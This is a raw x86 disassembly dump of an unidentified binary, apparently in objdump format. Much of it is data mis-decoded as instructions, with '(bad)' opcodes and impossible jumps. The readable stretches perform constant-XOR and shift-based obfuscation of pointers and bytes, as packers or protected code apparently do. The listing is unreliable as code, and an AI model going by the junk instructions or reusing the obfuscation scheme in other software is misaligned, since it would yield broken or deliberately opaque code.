  4094b1:	xor    al,0x42
  4094b3:	mov    al,0x18
  4094b5:	mov    ebp,0xc7d2589a
  4094ba:	push   ds
  4094bb:	cwde   
  4094bc:	mov    esp,esp
  4094be:	out    0x98,eax
  4094c0:	shl    ah,1
  4094c2:	std    
  4094c3:	xbegin 0xaa2ca862
  4094c9:	or     eax,DWORD PTR [edx-0xb]
  4094cc:	sbb    dl,BYTE PTR [edx+0x767e3893]
  4094d2:	adc    al,BYTE PTR [edi+0x7]
  4094d5:	outs   dx,BYTE PTR ds:[esi]
  4094d6:	xchg   edx,eax
  4094d7:	cmp    dh,al
  4094d9:	outs   dx,DWORD PTR ds:[esi]
  4094da:	xor    BYTE PTR [esi+0x55],bl
  4094dd:	inc    ecx
  4094de:	jg     0x4094d3
  4094e0:	imul   ebp,ebp,0x6b55169d
  4094e6:	and    edi,DWORD PTR [edi+0x57]
  4094e9:	fs sub edi,eax
  4094ec:	xor    DWORD PTR [esi+0x12],ecx
  4094ef:	leave  
  4094f0:	jo     0x4094f0
  4094f2:	xchg   esp,eax
  4094f3:	sti    
  4094f4:	xchg   DWORD PTR [esi],ebp
  4094f6:	icebp  
  4094f7:	mov    ebx,0xbcf8813f
  4094fc:	fsub   st,st(1)
  4094fe:	popf   
  4094ff:	pop    ds
  409500:	mov    dl,BYTE PTR [esi-0x1c]
  409503:	inc    ebx
  409504:	iret   
  409505:	lods   eax,DWORD PTR ds:[esi]
  409506:	ret    0x8015
  409509:	pop    ds
  40950a:	jae    0x40954c
  40950c:	xor    al,0x6e
  40950e:	cmp    BYTE PTR [ecx-0x18dc10c0],dl
  409514:	add    al,0x6
  409516:	and    dh,dl
  409518:	mov    dh,BYTE PTR [edi]
  40951a:	lahf   
  40951b:	test   BYTE PTR [edi],ah
  40951d:	call   0x99d61b8d
  409522:	retf   0xcde7
  409525:	(bad)  
  409526:	xchg   ebx,eax
  409527:	sub    al,0xab
  409529:	adc    al,0xe7
  40952b:	xor    eax,0x5a073a1
  409530:	push   0xffffffb5
  409532:	in     eax,0x44
  409534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409535:	push   ebx
  409536:	pop    edx
  409537:	sbb    eax,0xb713266a
  40953c:	or     al,0x9e
  40953e:	rcl    DWORD PTR [eax+edx*2],0xb2
  409542:	xchg   edx,eax
  409543:	sbb    ch,BYTE PTR [edi-0x4a7f5d31]
  409549:	mov    dh,0xd7
  40954b:	adc    ebx,edi
  40954d:	mov    ds:0xe3cbaf02,al
  409552:	outs   dx,DWORD PTR ds:[esi]
  409553:	ins    BYTE PTR es:[edi],dx
  409554:	sbb    ebx,DWORD PTR [edx-0x1b]
  409557:	jle    0x4095c3
  409559:	and    bl,ah
  40955b:	mov    esi,0x17a2138f
  409560:	cdq    
  409561:	cmc    
  409562:	cld    
  409563:	pop    eax
  409564:	sub    DWORD PTR [edi+0x33],esp
  409567:	fdivr  DWORD PTR [ebx+0x4129ca53]
  40956d:	inc    esi
  40956e:	and    esi,DWORD PTR [eax+0x53798582]
  409574:	or     BYTE PTR [edi+0x3],cl
  409577:	jae    0x409581
  409579:	imul   ecx,DWORD PTR [edx-0x52a24f94],0x66
  409580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409581:	cs push es
  409583:	sub    DWORD PTR [edx+0xb],edx
  409586:	sbb    eax,0x5ee0a067
  40958b:	cdq    
  40958c:	outs   dx,DWORD PTR ds:[esi]
  40958d:	sub    BYTE PTR [ecx+edx*8],al
  409590:	pop    ds
  409591:	jo     0x409526
  409593:	hlt    
  409594:	pop    ebx
  409595:	adc    esi,0x44a92c8b
  40959b:	mov    edi,ecx
  40959d:	add    esp,DWORD PTR [ecx]
  40959f:	jo     0x409606
  4095a1:	fisttp WORD PTR [ebx+esi*2+0x3d]
  4095a5:	and    DWORD PTR [ebx+ebx*4+0x6a],0x2f95ba34
  4095ad:	out    0xc1,al
  4095af:	jp     0x4095fb
  4095b1:	(bad)  
  4095b2:	adc    eax,0x6f0a0292
  4095b7:	xor    BYTE PTR [esi],ah
  4095b9:	mov    esi,0x18c6aacd
  4095be:	dec    ebp
  4095bf:	mov    esp,0x2599fa0d
  4095c4:	rcr    esp,0x47
  4095c7:	push   ecx
  4095c8:	push   cs
  4095c9:	lods   eax,DWORD PTR ds:[esi]
  4095ca:	xchg   edx,eax
  4095cb:	cli    
  4095cc:	adc    al,0x4d
  4095ce:	sub    edi,DWORD PTR [ecx-0x123c3a3f]
  4095d4:	imul   ebx,DWORD PTR [eax-0x58],0xeccc8872
  4095db:	(bad)  
  4095dc:	(bad)  
  4095dd:	fisubr WORD PTR [edi-0x34]
  4095e0:	in     al,dx
  4095e1:	jecxz  0x40961e
  4095e3:	pop    ds
  4095e4:	out    dx,eax
  4095e5:	push   es
  4095e6:	xchg   edx,eax
  4095e7:	inc    ebp
  4095e8:	pushf  
  4095e9:	iret   
  4095ea:	sti    
  4095eb:	test   BYTE PTR [edx+0x3ab93b27],dl
  4095f1:	outs   dx,DWORD PTR ds:[esi]
  4095f2:	nop
  4095f3:	sbb    ah,ch
  4095f5:	scas   al,BYTE PTR es:[edi]
  4095f6:	daa    
  4095f7:	outs   dx,DWORD PTR ds:[esi]
  4095f8:	jne    0x4095b5
  4095fa:	jbe    0x409677
  4095fc:	adc    edx,esi
  4095fe:	mov    ebx,0xb20c32bb
  409603:	pop    edi
  409604:	es inc edx
  409606:	mov    bh,BYTE PTR fs:[eax+esi*2]
  40960a:	adc    DWORD PTR [esi-0x4fe1a354],ebp
  409610:	mov    dl,0x82
  409612:	mov    ecx,0xad9bb247
  409617:	loopne 0x4095b2
  409619:	fdiv   DWORD PTR [ebp+0x3034e6f9]
  40961f:	inc    esi
  409620:	test   DWORD PTR [ebp+0x6bc6c43c],0x85fac356
  40962a:	push   edx
  40962b:	mov    edx,DWORD PTR [esi]
  40962d:	shl    eax,0x2
  409630:	mov    DWORD PTR [ebp+0x10],edx
  409633:	mov    edx,DWORD PTR [esi+0x4]
  409636:	xor    eax,0xca79a575
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x422588
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0x7dbca5c6
  4097de:	call   0x4188547a
  4097e3:	sbb    BYTE PTR [eax],bl
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    cl,dh
  4097ea:	sbb    bl,BYTE PTR [eax]
  4097ec:	fbstp  TBYTE PTR [ebx]
  4097ee:	push   0x1
  4097f0:	push   ecx
  4097f1:	push   ss
  4097f2:	push   cs
  4097f3:	scas   al,BYTE PTR es:[edi]
  4097f4:	xor    bh,BYTE PTR [eax-0x295e48b1]
  4097fa:	jg     0x409878
  4097fc:	ins    DWORD PTR es:[edi],dx
  4097fd:	pop    esi
  4097fe:	dec    edi
  4097ff:	mov    ah,0xb6
  409801:	mov    al,ds:0x91ac7d54
  409806:	xchg   esi,eax
  409807:	sbb    bh,BYTE PTR ds:[edx+ecx*2+0x386d56cd]
  40980f:	stos   BYTE PTR es:[edi],al
  409810:	mov    al,0x19
  409812:	in     eax,0x8
  409814:	dec    ebx
  409815:	bound  ebx,QWORD PTR [edi]
  409817:	call   0x9d231b38
  40981c:	popf   
  40981d:	pop    ds
  40981e:	inc    esi
  40981f:	not    BYTE PTR [eax-0x1b6ec5c6]
  409825:	jae    0x409819
  409827:	loop   0x40983c
  409829:	test   eax,0x27f792d
  40982e:	pop    esp
  40982f:	xchg   ecx,eax
  409830:	(bad)  
  409831:	jne    0x4097df
  409833:	and    BYTE PTR [esi-0x21],0x9f
  409837:	icebp  
  409838:	test   al,0x75
  40983a:	xchg   esp,eax
  40983b:	cld    
  40983c:	repnz sbb al,BYTE PTR [ebx-0x4083e86c]
  409843:	jecxz  0x409827
  409845:	mov    ecx,0x67e71287
  40984a:	adc    cl,BYTE PTR [edx+0x5a]
  40984d:	dec    ebp
  40984e:	xor    BYTE PTR ds:0x64fc504a,ch
  409854:	shl    BYTE PTR [edi+0x10114a42],0x2f
  40985b:	inc    ebp
  40985c:	and    eax,0xd57ddb59
  409861:	gs dec ecx
  409863:	loopne 0x4097f7
  409865:	mov    ebx,0x9e859929
  40986a:	outs   dx,BYTE PTR ds:[esi]
  40986b:	sub    al,0xde
  40986d:	in     al,0x71
  40986f:	cdq    
  409870:	je     0x4098de
  409872:	sub    bl,BYTE PTR [edi+0x21347ca0]
  409878:	dec    ecx
  409879:	sbb    al,0xff
  40987b:	jb     0x4098e4
  40987d:	pushf  
  40987e:	mov    bl,BYTE PTR [esi+0x1a9c73f3]
  409884:	jecxz  0x40982e
  409886:	jmp    0x227f25ff
  40988b:	sbb    al,0x22
  40988d:	jmp    0x40982f
  40988f:	aaa    
  409890:	push   ebp
  409891:	lock repz fwait
  409894:	sub    bl,BYTE PTR [ecx+0x4f3d96e2]
  40989a:	dec    ebx
  40989b:	iret   
  40989c:	sub    eax,0xccf81660
  4098a1:	inc    ecx
  4098a2:	stc    
  4098a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098a4:	mov    ?,WORD PTR [esp+edx*8+0x6d]
  4098a8:	cmp    esi,DWORD PTR [ecx]
  4098aa:	mov    ds:0x8c86bf07,eax
  4098af:	ret    0x152e
  4098b2:	pop    ebx
  4098b3:	push   eax
  4098b4:	rol    BYTE PTR [edi+esi*1-0x56],cl
  4098b8:	pop    eax
  4098b9:	rcr    DWORD PTR [ebx],1
  4098bb:	sbb    eax,0xe8591540
  4098c0:	sub    DWORD PTR [edi+0x3f80ad5b],0xffffffdb
  4098c7:	jecxz  0x4098a6
  4098c9:	jno    0x4098a7
  4098cb:	popf   
  4098cc:	(bad)  
  4098cd:	dec    ecx
  4098ce:	call   0xdf93:0x68a3e019
  4098d5:	daa    
  4098d6:	sbb    ebx,ecx
  4098d8:	push   0xffffffbd
  4098da:	inc    ebp
  4098db:	inc    eax
  4098dc:	ja     0x4098f0
  4098de:	aas    
  4098df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098e0:	xchg   ebp,ebx
  4098e2:	cli    
  4098e3:	xchg   BYTE PTR [ebx+0x603f788e],ch
  4098e9:	sub    ecx,esi
  4098eb:	mov    eax,DWORD PTR [edi-0x66]
  4098ee:	lods   eax,DWORD PTR ds:[esi]
  4098ef:	lds    ecx,FWORD PTR [esi]
  4098f1:	rol    DWORD PTR [ebx+0x16],1
  4098f4:	cli    
  4098f5:	iret   
  4098f6:	mov    ds:0x13203555,al
  4098fb:	mov    ds:0xefe4def1,al
  409900:	push   esp
  409901:	ja     0x40996b
  409903:	mov    al,ds:0x6c4649a1
  409908:	push   edx
  409909:	frstor [esi-0x21]
  40990c:	jb     0x40992e
  40990e:	dec    esp
  40990f:	push   cs
  409910:	push   ecx
  409911:	jmp    0x4098b4
  409913:	ins    DWORD PTR es:[edi],dx
  409914:	xlat   BYTE PTR ds:[ebx]
  409915:	retf   0x49f
  409918:	and    edx,DWORD PTR [edi-0x3e5cf97d]
  40991e:	push   ecx
  40991f:	cli    
  409920:	xlat   BYTE PTR ds:[ebx]
  409921:	add    BYTE PTR [edx],dl
  409923:	sub    DWORD PTR [esp+edi*2],0x1c
  409927:	xor    DWORD PTR [esi-0x4c768e],eax
  40992d:	loop   0x40993b
  40992f:	cmc    
  409930:	ret    0x22fa
  409933:	cmp    al,BYTE PTR [edi-0x26]
  409936:	sbb    DWORD PTR [edx+0x31a01a75],esp
  40993c:	mov    ch,0xfd
  40993e:	dec    ebp
  40993f:	in     eax,0xf3
  409941:	stc    
  409942:	mov    ch,BYTE PTR [edx-0x347366d7]
  409948:	in     al,dx
  409949:	jne    0x4098ce
  40994b:	pop    eax
  40994c:	or     eax,0x6fa83cca
  409951:	comiss xmm3,xmm7
  409954:	mov    esi,0xe0952b51
  409959:	mov    ebp,0x62959cd8
  40995e:	jnp    0x4099c0
  409960:	scas   al,BYTE PTR es:[edi]
  409961:	inc    eax
  409962:	pop    ss
  409963:	shr    DWORD PTR [eax-0x309c3e3d],cl
  409969:	push   0x2fb34d2f
  40996e:	test   BYTE PTR ds:0xb82a8af1,ah
  409974:	push   cs
  409975:	rcl    BYTE PTR [ebx],cl
  409977:	pop    edi
  409978:	adc    eax,0xc683fd72
  40997d:	lods   eax,DWORD PTR ds:[esi]
  40997e:	nop
  40997f:	retf   
  409980:	imul   esi,DWORD PTR [edi+0x20],0x22
  409984:	pop    esp
  409985:	jno    0x4099c1
  409987:	dec    eax
  409988:	aad    0x6c
  40998a:	ret    
  40998b:	sub    ebx,0xe4a73fd1
  409991:	mov    esp,0x51dab870
  409996:	loopne 0x4099c0
  409998:	(bad)  
  409999:	fisttp QWORD PTR [ecx-0x67]
  40999c:	pushf  
  40999d:	pop    ecx
  40999e:	imul   esp,DWORD PTR [edi+0x5d515b69],0xffffffd7
  4099a5:	inc    ecx
  4099a6:	out    0xd1,eax
  4099a8:	add    bh,BYTE PTR [ebx-0x5f651018]
  4099ae:	and    al,0x3a
  4099b0:	mov    cl,0x7c
  4099b2:	cwde   
  4099b3:	loop   0x409943
  4099b5:	data16 outs dx,BYTE PTR ds:[esi]
  4099b7:	das    
  4099b8:	cwde   
  4099b9:	(bad)  [esi+0x31]
  4099bc:	add    BYTE PTR [esi-0x39e78579],ch
  4099c2:	fs out 0xd3,ax
  4099c6:	xor    DWORD PTR [ecx-0x20],esp
  4099c9:	repnz xchg esp,eax
  4099cb:	loopne 0x4099a3
  4099cd:	push   esp
  4099ce:	fimul  DWORD PTR [esi+ecx*4-0x7a04495e]
  4099d5:	xor    al,0x8a
  4099d7:	inc    ebp
  4099d8:	cmp    al,0x2c
  4099da:	jl     0x409a1f
  4099dc:	xor    eax,0xae88d41f
  4099e1:	xchg   DWORD PTR [ecx],ecx
  4099e3:	ds inc esi
  4099e5:	xchg   edi,eax
  4099e6:	lods   eax,DWORD PTR ds:[esi]
  4099e7:	ins    DWORD PTR es:[edi],dx
  4099e8:	adc    al,0xc1
  4099ea:	lahf   
  4099eb:	push   ebx
  4099ec:	pusha  
  4099ed:	mov    BYTE PTR [eax-0x60],ch
  4099f0:	es stc 
  4099f2:	sub    BYTE PTR [ecx+0x1e9b674d],ah
  4099f8:	out    dx,al
  4099f9:	xor    DWORD PTR [eax+0x10a913ed],ebp
  4099ff:	mov    WORD PTR fs:[esi+0x46],gs
  409a03:	xchg   esi,eax
  409a04:	mov    dh,0xc7
  409a06:	pop    esp
  409a07:	pop    ss
  409a08:	mov    DWORD PTR [ebp-0x2a],ebx
  409a0b:	pop    ds
  409a0c:	cmp    bh,BYTE PTR [edx]
  409a0e:	call   0x89ca:0x814ff94d
  409a15:	push   esp
  409a16:	xchg   DWORD PTR [ecx-0x3fc193a9],ebx
  409a1c:	adc    eax,0x80d3d867
  409a21:	retf   0x7452
  409a24:	inc    edi
  409a25:	arpl   WORD PTR [ebp+0x2e],dx
  409a28:	loop   0x409a59
  409a2a:	iret   
  409a2b:	sub    ebx,DWORD PTR [ecx-0x55605e3e]
  409a31:	adc    al,0xa0
  409a33:	jne    0x409a59
  409a35:	nop
  409a36:	and    bh,ah
  409a38:	aas    
  409a39:	rol    DWORD PTR [edi+0x30bf75a1],cl
  409a3f:	cmp    al,BYTE PTR [ebx+0x5b38b4e6]
  409a45:	cmc    
  409a46:	or     al,0x7
  409a48:	push   ecx
  409a49:	pop    esp
  409a4a:	out    dx,eax
  409a4b:	mov    WORD PTR [eax-0x6f2da942],fs
  409a51:	and    eax,0xd644cd90
  409a56:	inc    ecx
  409a57:	xchg   ebx,eax
  409a58:	retf   0x44
  409a5b:	mov    bl,0x2d
  409a5d:	xchg   ebx,eax
  409a5e:	mov    ecx,0x877d2b1b
  409a63:	aam    0xbd
  409a65:	xor    BYTE PTR [ebx+eiz*4+0x1522c8eb],dl
  409a6c:	dec    esp
  409a6d:	les    edi,FWORD PTR [eax+edx*8]
  409a70:	cli    
  409a71:	imul   ecx,DWORD PTR [edx-0xfbc9af0],0xf38478c4
  409a7b:	or     dl,BYTE PTR [edi+0x286df6c0]
  409a81:	int    0xef
  409a83:	sub    esi,DWORD PTR [ebp-0x72d8901a]
  409a89:	repz sti 
  409a8b:	jns    0x409ada
  409a8d:	push   edi
  409a8e:	xor    al,BYTE PTR [ecx-0x65c4603c]
  409a94:	in     al,dx
  409a95:	xchg   dl,bl
  409a97:	cwde   
  409a98:	clc    
  409a99:	leave  
  409a9a:	fisttp DWORD PTR [ebp-0x7bfba2ae]
  409aa0:	xor    bh,BYTE PTR [edx-0x1d]
  409aa3:	pop    ss
  409aa4:	gs push esi
  409aa6:	sbb    dh,0x76
  409aa9:	mov    ebp,0xbd6dbb99
  409aae:	adc    eax,0x2ddf3ab2
  409ab3:	loop   0x409b15
  409ab5:	fwait
  409ab6:	jbe    0x409a5c
  409ab8:	pop    ss
  409ab9:	jb     0x409b14
  409abb:	cdq    
  409abc:	xor    eax,0xe631e8dc
  409ac1:	dec    ebx
  409ac2:	iret   
  409ac3:	inc    ebx
  409ac4:	jecxz  0x409acb
  409ac6:	and    BYTE PTR [edx+0x694df332],dh
  409acc:	pusha  
  409acd:	mov    bl,0x33
  409acf:	xchg   esi,eax
  409ad0:	ins    DWORD PTR es:[edi],dx
  409ad1:	sbb    al,0x47
  409ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ad4:	cmp    ecx,DWORD PTR [esi+0x79]
  409ad7:	mov    bl,0xf1
  409ad9:	ret    0x2806
  409adc:	leave  
  409add:	ret    0xf63d
  409ae0:	push   edi
  409ae1:	fucom  st(4)
  409ae3:	call   0xafa5:0x95979366
  409aea:	xchg   DWORD PTR [ebx],eax
  409aec:	pop    eax
  409aed:	push   ebx
  409aee:	nop
  409aef:	sbb    BYTE PTR [ebp+0x6d],ah
  409af2:	jp     0x409ad6
  409af4:	(bad)  
  409af5:	loop   0x409ab5
  409af7:	ror    DWORD PTR [ebx-0x52f5b187],1
  409afd:	xchg   edi,eax
  409afe:	arpl   WORD PTR [esi+0x2c],ax
  409b01:	cmp    al,0x12
  409b03:	inc    ebx
  409b04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b05:	mov    esi,DWORD PTR [esi-0x6546b655]
  409b0b:	je     0x409b49
  409b0d:	ds or  edi,ecx
  409b10:	shr    BYTE PTR [edi+esi*1],cl
  409b13:	xor    DWORD PTR ds:0xf66dfb62,esi
  409b19:	retf   
  409b1a:	xor    BYTE PTR [eax-0xa844741],bl
  409b20:	daa    
  409b21:	xchg   edx,eax
  409b22:	mov    ebx,0xfea5d851
  409b27:	cdq    
  409b28:	xchg   bl,bl
  409b2a:	(bad)  
  409b2b:	(bad)  
  409b2d:	adc    eax,0x8a6996f6
  409b32:	jnp    0x409b03
  409b34:	add    edi,DWORD PTR [esi-0x1be24ac8]
  409b3a:	xchg   esi,eax
  409b3b:	inc    ebx
  409b3c:	out    0xee,eax
  409b3e:	ds or  al,0x6b
  409b41:	(bad)  
  409b42:	out    dx,eax
  409b43:	frstor ds:0x7f3efff1
  409b49:	xor    BYTE PTR [ebx+edx*4+0x6c],0x48
  409b4e:	data16 adc BYTE PTR ss:[eax+0x3b],0x61
  409b54:	push   edx
  409b55:	pushf  
  409b56:	ficom  WORD PTR [ecx-0x4bbc0188]
  409b5c:	ss push 0x58
  409b5f:	or     eax,0x281de230
  409b64:	pop    ebp
  409b65:	and    eax,0x4a2352dd
  409b6b:	fdivr  QWORD PTR [esi+0x8ab882b]
  409b71:	dec    esi
  409b72:	outs   dx,BYTE PTR ds:[esi]
  409b73:	mov    al,0xd9
  409b75:	add    bh,BYTE PTR [esi-0x170dc9b2]
  409b7b:	dec    ebx
  409b7c:	fldenv [eax-0xb]
  409b7f:	retf   
  409b80:	in     al,dx
  409b81:	push   edx
  409b82:	push   eax
  409b83:	inc    ecx
  409b84:	mov    esi,0x4388652a
  409b89:	aad    0x41
  409b8b:	push   0xffffff8f
  409b8d:	sbb    eax,0xfcd8406d
  409b92:	ret    0xe590
  409b95:	div    DWORD PTR [ecx]
  409b97:	jbe    0x409c14
  409b99:	aam    0x3e
  409b9b:	sbb    bl,ah
  409b9d:	in     eax,0x7f
  409b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ba0:	retw   0x4f65
  409ba4:	test   eax,0x5dc9defb
  409ba9:	adc    esi,DWORD PTR [ebx]
  409bab:	ror    BYTE PTR [ebx],cl
  409bad:	ret    0x503
  409bb0:	mov    BYTE PTR ds:0x45890042,ah
  409bb6:	adc    al,0x8b
  409bb8:	inc    ebp
  409bb9:	mov    al,ds:0xfa44d8b
  409bbe:	lods   al,BYTE PTR ds:[esi]
  409bbf:	enter  0xc102,0xe9
  409bc3:	add    cl,BYTE PTR [ebx+0x558ba04d]
  409bc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x422588
  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x422588
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
